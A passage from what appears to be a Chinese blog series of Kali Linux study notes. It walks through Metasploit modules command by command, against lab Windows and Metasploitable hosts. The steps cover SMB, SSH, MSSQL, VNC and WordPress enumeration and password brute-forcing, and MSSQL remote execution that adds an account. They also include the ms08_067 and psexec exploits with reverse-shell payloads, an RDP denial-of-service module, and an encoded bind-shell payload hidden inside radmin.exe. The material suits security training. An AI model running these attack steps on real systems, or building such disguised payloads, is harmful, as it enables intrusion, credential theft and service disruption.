<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SNMP用户枚举<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enumusers</code></strong>（windows）<ul>
<li><strong><code>🔺命令：set RHOST Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SNMP共享枚举<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enumshares</code></strong>（windows）<ul>
<li><strong><code>🔺命令：set RHOST Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：show advanced/options</code></strong><ul>
<li><strong><code>🔺命令：set VERBOSE true</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 无法显示隐藏的共享</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="6-SMB扫描（Metasploit和Window-Server-2003）"><a href="#6-SMB扫描（Metasploit和Window-Server-2003）" class="headerlink" title="6. SMB扫描（Metasploit和Window Server 2003）"></a>6. SMB扫描（Metasploit和Window Server 2003）</h4><ul>
<li>SMB版本扫描<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_version</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit和Window Server</code></strong>2003的IP（▲中间需空格）</li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPass/SMBUser</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>扫描命名管道，判断SMB服务类型（账号，密码）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/pipe_auditor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>扫描通过SMB管道可以访问的RCERPC服务<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/pipe_dcerpc_auditor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit和Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SMB共享枚举（账号，密码）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_enumshares</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SMB用户共享（账号，密码）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_enumusers</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SID枚举（账号，密码）<ul>
<li>▲ 主板创建账号时，以毫米级的时间为基准创建的唯一安全标识符，抽象于账号名称</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_lookupsid</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 系统自生成的账号，Administrator的RID为500，Guest的RID为501，自创建的新账号从1000开始，一般安全人员会对Administrator的名称进行修改成一个不其起眼的账号名称，另设一个权限非常小且密码复杂的名字为Administrator的非管理员权限账号</li>
</ul>
</li>
</ul>
<h4 id="7-SSH扫描（Metasploit）"><a href="#7-SSH扫描（Metasploit）" class="headerlink" title="7. SSH扫描（Metasploit）"></a>7. SSH扫描（Metasploit）</h4><ul>
<li>SSH版本扫描<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_version</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SSH密码爆破<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_login</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</code></strong>（可在字典中添加正确的密码）</li>
<li><strong><code>🔺命令：set VERBOSE false</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SSH公钥登陆<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_login_pubkey</code></strong><ul>
<li><strong><code>🔺命令：set KEY_FILE id_rsa</code></strong> </li>
<li><strong><code>🔺命令：set USERNAME root</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-SQL-Server扫描（安装有sql-server的Window-7）"><a href="#8-SQL-Server扫描（安装有sql-server的Window-7）" class="headerlink" title="8. SQL Server扫描（安装有sql server的Window 7）"></a>8. SQL Server扫描（安装有sql server的Window 7）</h4><ul>
<li>▲ 2020.2.28 Window 7无安装sql server</li>
<li>Mssql扫描端口<ul>
<li>▲ TCP/IP连接需要开启/sql server的网络服务需要开启</li>
<li>TCP 1433（动态端口）/ UDP 1434（查询TCP端口号，mssql）</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/mssql/mssql_ping</code></strong> <ul>
<li><strong><code>🔺命令：set RHOSTS Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong>（可查到随机动态高危端口）</li>
</ul>
</li>
</ul>
</li>
<li>爆破mssql密码<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/mssql/mssql_login</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：set username sa</code></strong></li>
<li><strong><code>🔺命令：set password /usr/share/password.txt</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>远程执行代码<ul>
<li>▲ 从端口扫描和密码爆破的端口和密码可用于远程代码执行</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/admin/mssql/mssql_exec</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：set PASSWORD</code></strong></li>
<li><strong><code>🔺命令：set RPORT</code></strong></li>
<li><strong><code>🔺命令：set CMD net user user pass /ADD</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="9-FTP扫描（Metasploit）"><a href="#9-FTP扫描（Metasploit）" class="headerlink" title="9. FTP扫描（Metasploit）"></a>9. FTP扫描（Metasploit）</h4><ul>
<li>FTP版本扫描<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/ftp_version</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/anonymous</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/ftp_login</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="10-系统补丁"><a href="#10-系统补丁" class="headerlink" title="10. 系统补丁"></a>10. 系统补丁</h4><ul>
<li>Windows缺少的补丁（Window XP SP3）</li>
<li>上微软的官网查看ms08-067对应的KB编号<ul>
<li>▲ 基于已经取得session进行检测</li>
<li>⭐ <strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
<li><strong><code>🔺命令：migrate 1060</code></strong>（其他模块）</li>
<li><strong><code>🔺命令：background</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use post/windows/gather/enum_patches</code></strong> <ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set KB KB958644</code></strong></li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set VERBOSE yes</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 查看是否KB958644为missing</li>
<li>▲ 检查失败<ul>
<li>Known bug in WMI query, try migrating to another process</li>
<li>迁移到另一个进程再次尝试</li>
</ul>
</li>
<li>▲ 2020.2.28 此模块使用后返回数据过于奇怪</li>
</ul>
</li>
</ul>
<h4 id="11-应用弱点扫描（Metasploit、Window-XP-SP3和Window-7）"><a href="#11-应用弱点扫描（Metasploit、Window-XP-SP3和Window-7）" class="headerlink" title="11. 应用弱点扫描（Metasploit、Window XP SP3和Window 7）"></a>11. 应用弱点扫描（Metasploit、Window XP SP3和Window 7）</h4><ul>
<li>根据信息收集结果搜索漏洞利用模块</li>
<li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li>
<li>误判率、漏判率</li>
<li>VNC密码破解<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vnc/vnc_login</code></strong><ul>
<li><strong><code>🔺命令：set BLANK_PASSWORD yes</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：set THREADS 30</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>VNC无密码访问<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vnc/vnc_none_auth</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>supported：None, free access!</li>
</ul>
</li>
<li>RDP远程桌面漏洞<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/rdp/ms12_020_check</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window XP SP和Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>检查不会造成DoS攻击</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>此模块会造成DoS攻击</li>
</ul>
</li>
<li>设备后门<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/juniper_backdoor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS juniper的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/fortinet_backdoor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS fortinet的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 此两个设备无下载，此模块暂无实验</li>
</ul>
</li>
<li>VMWare ESXi 密码爆破<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vmware/vmauthd_login</code></strong><ul>
<li><strong><code>🔺命令：set BLANK_PASSWORD yes</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 网段</code></strong></li>
<li><strong><code>🔺命令：set PASSWORD 查询密码</code></strong></li>
<li><strong><code>🔺命令：set PASS_FILE 密码文件</code></strong></li>
<li><strong><code>🔺命令：set USERNAME 账号名称</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vmware/vmware_enum_vms</code></strong><ul>
<li><strong><code>🔺命令：set PASSWORD 已破解主机的密码</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 已破解主机的IP</code></strong></li>
<li><strong><code>🔺命令：set USERNAME 已破解主机的账号名称</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 暂无下载VMWare ESXI，此模块暂无实验</li>
</ul>
</li>
<li>利用WEB API远程开启虚拟机<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/admin/vmware/poweron_vm</code></strong><ul>
<li><strong><code>🔺命令：set PASSWORD 已破解主机的密码</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 已破解主机的IP</code></strong></li>
<li><strong><code>🔺命令：set USERNAME 已破解主机的账号名称</code></strong></li>
<li><strong><code>🔺命令：set VM 要开启的虚拟机</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 此模块需开启VMware Workstation Server，即监听443端口，但可能报错未能配置，此模块暂无实验</li>
</ul>
</li>
</ul>
<h4 id="12-HTTP弱点扫描（Metasploit）"><a href="#12-HTTP弱点扫描（Metasploit）" class="headerlink" title="12. HTTP弱点扫描（Metasploit）"></a>12. HTTP弱点扫描（Metasploit）</h4><ul>
<li>过期证书<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/cert</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 目标主机的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>显示目录及文件<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/dir_listing</code></strong>（目录遍历）<ul>
<li><strong><code>🔺命令：set PATH 设置要查询的目录</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/files_dir</code></strong>（爬网爆破模块）<ul>
<li><strong><code>🔺命令：set Dictionary /usr/share/metasploit-framework/data/wmap/wmap_files.txt</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>WebDAV Unicode编码身份验证绕过<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/dir_webdav_unicode_bypass</code></strong><ul>
<li><strong><code>🔺命令：set Dictionary /usr/share/metasploit-framework/data/wmap/wmap_files.txt</code></strong></li>
<li><strong><code>🔺命令：set HTTP404S /usr/share/metasploit-framework/data/wmap/wmap_404s.txt</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Tomcat管理登陆页面<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/tomcat_mgr_login</code></strong><ul>
<li><strong><code>🔺命令：set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 暂无下载配置Tomcat登陆界面，此模块暂无实验</li>
</ul>
</li>
<li>基于HTTP方法的身份验证绕过<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/verb_auth_bypass</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Wordpress密码爆破<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/wordpress_login_enum</code></strong><ul>
<li><strong><code>🔺命令：set URI/wordpress/wp-login.php</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 暂无下载配置Wordpress登陆界面，此模块暂无实验</li>
</ul>
</li>
</ul>
<h4 id="13-WMAP-WEB应用扫描器"><a href="#13-WMAP-WEB应用扫描器" class="headerlink" title="13. WMAP WEB应用扫描器"></a>13. WMAP WEB应用扫描器</h4><ul>
<li>根据SQLMAP的工作方式开发</li>
<li><strong><code>🔺命令：load wmap</code></strong></li>
<li><strong><code>🔺命令：wmap_sites -a http://Metasploit的IP</code></strong><ul>
<li>-a：列出url的站点</li>
</ul>
</li>
<li><strong><code>🔺命令：wmap_targets -t http://Metasploit的IP/mutillidae/index.php</code></strong><ul>
<li>-t：指定具体扫描目标</li>
</ul>
</li>
<li><strong><code>🔺命令：wmap_run -t</code></strong><ul>
<li>-t：显示具体模块被使用</li>
<li>-e：执行，具体执行的模块 </li>
</ul>
</li>
<li><strong><code>🔺命令：wmap_vulns -l</code></strong><ul>
<li>-l：查看已经发现的漏洞结果</li>
</ul>
</li>
<li><strong><code>🔺命令：vulns</code></strong></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/" itemprop="url">Kali Linux笔记(一百零二)：MSF模块--Payload、Encoders</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T23:20:54+08:00">
                2020-02-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  377 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-payload模块和encoders模块"><a href="#1-payload模块和encoders模块" class="headerlink" title="1. payload模块和encoders模块"></a>1. payload模块和encoders模块</h4><ul>
<li><strong><code>🔺命令：use payload/windows/shell_bind_tcp</code></strong><ul>
<li>▲ 默认情况下Ruby语言的shellcode</li>
<li>RHOST：用于限制来源IP，非发送IP </li>
<li><strong><code>🔺命令：generate</code></strong>（坏字符）</li>
</ul>
</li>
<li>msf自动选择编码绕过坏字符<ul>
<li><strong><code>🔺命令：show encodes</code></strong>：查看可进行编码的模块</li>
<li><strong><code>🔺命令：generate -b &#39;\x00&#39;</code></strong> </li>
<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></strong> </li>
<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b \xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&#39;</code></strong>（过滤字符过多，可能没有编码方式）</li>
</ul>
</li>
<li>手动指定编码模块<ul>
<li>参数<ul>
<li>-t：输出格式（可以使用C/python/java，generate -t c/python/java，默认为Ruby）▲ 2020.2.26 无-t操作，输出格式为-f</li>
<li>-i：加密的轮数</li>
<li>-k：不产生新的进程</li>
<li>-x：使用的程序模板  </li>
<li>-f：输出文件（包括路径）▲ 2020.2.26 -f操作为-o，-f为输出格式</li>
<li>-n：NOP sled length（无操作的长度） ▲ 2020.2.26 -s操作修改为-n</li>
</ul>
</li>
<li><strong><code>🔺命令：generate -e x86/nonalpha</code></strong></li>
<li><strong><code>🔺命令：generate -b &#39;\x00&#39; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe</code></strong></li>
<li>压缩1.exe为1.zip</li>
<li><strong><code>🔺命令：cp 1.exe /mnt/hgfs/share</code></strong></li>
<li>拷贝到win7的电脑端并解压</li>
<li>win7双击启动，<strong><code>🔺命令：netstat -nao | findstr &quot;4444&quot;</code></strong>（看是否开启端口）</li>
<li><strong><code>🔺命令：kali nc win7的IP 4444</code></strong></li>
</ul>
</li>
<li>▲ NOP：no-operation / Next Operation（无任何操作）<ul>
<li>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li>
<li><strong><code>🔺命令：generate -n 14</code></strong></li>
<li>比较有无NOP sled的payload的size长度</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Exploit/" itemprop="url">Kali Linux笔记(一百零一)：MSF模块--Exploit</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T16:36:47+08:00">
                2020-02-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  509 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Exploit模块"><a href="#1-Exploit模块" class="headerlink" title="1. Exploit模块"></a>1. Exploit模块</h4><ul>
<li>Active exploit<ul>
<li>攻击者主动发payload给被攻击方</li>
<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST 192.168.1.100</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST 192.168.1.1</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：set SMBUSER user1</code></strong> </li>
<li><strong><code>🔺命令：set SMBPASS pass1</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Passive Exploits <ul>
<li>被攻击者主动访问攻击者，攻击者返回payload给被攻击者</li>
<li><strong><code>🔺命令：use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</code></strong> <ul>
<li><strong><code>🔺命令：set URIPATH /</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：et LHOST 192.168.1.1</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Active-exploit"><a href="#2-实验–Active-exploit" class="headerlink" title="2. 实验–Active exploit"></a>2. 实验–Active exploit</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window 7主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>关闭防火墙，查看ip地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li><strong><code>🔺命令：msfconsole</code></strong><ul>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST Window 7的IP</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：set SMBUSER Window 7的一个用户账号</code></strong> </li>
<li><strong><code>🔺命令：set SMBPASS Window 7的一个用户密码</code></strong> </li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
<li><strong><code>🔺命令：sessions -l</code></strong></li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：shell</code></strong></li>
<li><strong><code>🔺命令：ifconfig</code></strong></li>
<li><strong><code>🔺命令：shutdown -r</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.2.26 该模块在win7上无法exploit</li>
</ul>
<h4 id="3-实验–Passive-Exploits"><a href="#3-实验–Passive-Exploits" class="headerlink" title="3. 实验–Passive Exploits"></a>3. 实验–Passive Exploits</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window 7主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>打开防火墙，查看ip地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li>msfconsole 重复Active exploit，看是否能进行连接</li>
</ul>
</li>
<li>Window XP SP2主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>打开防火墙，查看ip地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：msfconsole</code></strong><ul>
<li><strong><code>🔺命令：use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</code></strong><ul>
<li><strong><code>🔺命令：set SRVHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
